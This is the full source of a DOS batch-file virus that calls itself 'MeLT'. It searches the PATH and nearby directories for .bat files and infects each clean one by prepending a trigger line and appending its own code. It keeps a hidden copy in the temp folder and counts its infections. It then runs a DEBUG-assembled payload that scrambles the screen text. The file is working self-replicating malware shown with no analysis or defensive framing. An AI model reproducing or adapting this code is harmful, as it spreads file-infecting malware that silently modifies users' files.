@if not '%0==' if '%_melt%==' goto melt_xyz
@goto MeLT_zyx [Melt_3C] 
:MeLT_xyz
@echo off%_MeLT%
if '%1=='MeLT goto MeLT%2
if not exist %comspec% set comspec=%_MeLT%command
%comspec% /e:5000 /c %0 MeLT vir
set MeLTcl=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 MeLT rh
set _MeLT=
set MeLTcl=
goto MeLT_zyx
:MeLTrh
set _MeLT=x
%0 %MeLTcl% 
:MeLTvir
set MeLTH=%0
echo X|find "Y">nul.MeLT
if not errorlevel 1 exit MeLT
if not exist %_MeLT%%temp%\nul set temp=%tmp%
if exist %temp%\MeLT_3C goto MeLTrun
%0 MeLT fnd . %path% 
:MeLTfnd
shift%_MeLT%
if '%2==' exit MeLT
set MeLT=%2\%MeLTH%.bat
if not exist %MeLT% set MeLT=%2\%MeLTH%
if not exist %MeLT% set MeLT=%2%MeLTH%.bat
if not exist %MeLT% set MeLT=%2%MeLTH%
if not exist %MeLT% goto MeLTfnd 
find "MeLT"<%MeLT%>%temp%\MeLT_3C
attrib %temp%\MeLT_3C +h
:MeLTrun
%MeLTH% MeLT ser . .. %path% 
:MeLTser
shift%_MeLT%
if '%2==' exit MeLT
for %%a in (%2\*.bat %2*.bat) do call %MeLTH% MeLT inf %%a
goto MeLTser
:MeLTinf
find /i "MeLT"<%3>nul
if not errorlevel 1 goto MeLTno
echo @if not '%%0==' if '%%_melt%%==' goto melt_xyz>MeLT.t
type %3>>MeLT.t
echo.>>MeLT.t
type %temp%\MeLT_3C>>MeLT.t
move MeLT.t %3>nul
set setMeLT=x
call %MeLTH% MeLT _zyx
echo %setMeLT%|find "11111111">nul
if errorlevel 1 echo @if not '%%setmelt%%==' set setmelt=%setMeLT%1>>%3
if errorlevel 1 exit MeLT
echo @if not '%%setmelt%%==' set setmelt=1>>%3%_MeLT%
:MeLTact - melt screen text then back to normal
echo e 100 BA D0 07 BB 00 B8 8E C3 8B CA 33 FF 26 8B 05 FE>MeLT.t
echo e 110 C0 FE C4 26 89 05 47 47 E2 F2 FE 06 24 01 75 E8>>MeLT.t
echo e 120 B4 4C CD 21 00>>MeLT.t
echo g>>MeLT.t
debug<MeLT.t>nul
del MeLT.t
exit MeLT
:MeLTno
set MeLTC=%MeLTC%1
if %MeLTC%==1111111111111111 exit
:MeLT_zyx
@if not '%setmelt%==' set setmelt=1
